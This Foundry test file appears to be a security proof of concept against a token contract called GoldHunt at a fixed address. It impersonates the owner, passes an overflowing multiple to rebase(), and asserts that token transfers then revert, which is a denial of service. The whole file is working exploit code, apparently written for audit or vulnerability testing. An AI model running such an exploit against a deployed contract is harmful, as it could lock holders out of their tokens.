pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface GoldHunt {
    function owner() external view returns (address);
    function rebaseMultiple() external view returns (uint);
    function rebase(uint multiple) external;
    function setRewardsPool(address _rewardsPool) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner and set up preconditions
        address owner = GoldHunt(TARGET).owner();
        vm.startPrank(owner);

        // Set rewardsPool (required precondition)
        GoldHunt(TARGET).setRewardsPool(address(0x123));

        // Stop impersonation for now
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate owner
        address owner = GoldHunt(TARGET).owner();
        vm.startPrank(owner);

        // Step 2: Get current rebaseMultiple
        uint currentMultiple = GoldHunt(TARGET).rebaseMultiple();

        // Step 3: Calculate the multiple that will cause overflow
        // type(uint256).max / currentMultiple + 1 will overflow when multiplied
        uint overflowMultiple = type(uint256).max / currentMultiple + 1;

        // Step 4: Call rebase with the overflow multiple
        GoldHunt(TARGET).rebase(overflowMultiple);

        // Step 5: Verify rebaseMultiple is now > 1 (oracle check)
        uint newMultiple = GoldHunt(TARGET).rebaseMultiple();
        assertGt(newMultiple, 1, "rebaseMultiple should be > 1 after overflow attack");

        // Step 6: Demonstrate the DoS - try to transfer tokens (should revert)
        // First, get some tokens to test with
        address tokenHolder = owner; // owner has tokens from minting in constructor
        vm.stopPrank(); // Stop being owner

        // Try to transfer tokens - should revert due to overflow in amount * rebaseMultiple
        vm.startPrank(tokenHolder);
        bool transferSuccess = false;
        try GoldHunt(TARGET).transfer(address(0x456), 1) {
            transferSuccess = true;
        } catch {
            transferSuccess = false;
        }
        assertFalse(transferSuccess, "Transfer should revert after rebase overflow attack");
        vm.stopPrank();
        assertGt(newMultiple, 1, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
